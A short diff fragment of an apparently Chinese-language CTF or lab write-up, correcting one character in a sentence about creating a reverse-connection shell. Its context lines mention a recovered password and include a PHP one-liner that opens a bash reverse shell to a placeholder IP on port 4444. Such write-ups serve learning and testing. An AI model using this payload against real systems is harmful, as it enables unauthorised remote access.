@@ -107,7 +107,7 @@ jq -r ".content" config.txt > clean.txt
 返回了一段数据，看到pass，估计是密码，先留着
 ![截图](./domino/21.png)
 
-我们在本地创建一个简单的反向连接shell，复制一下代码
+我们在本地创建一个简单的反向连接shell，复制以下代码
 ```bash
 <?
 php system("bash -c 'bash -i >& /dev/tcp/ip/4444 0>&1'");
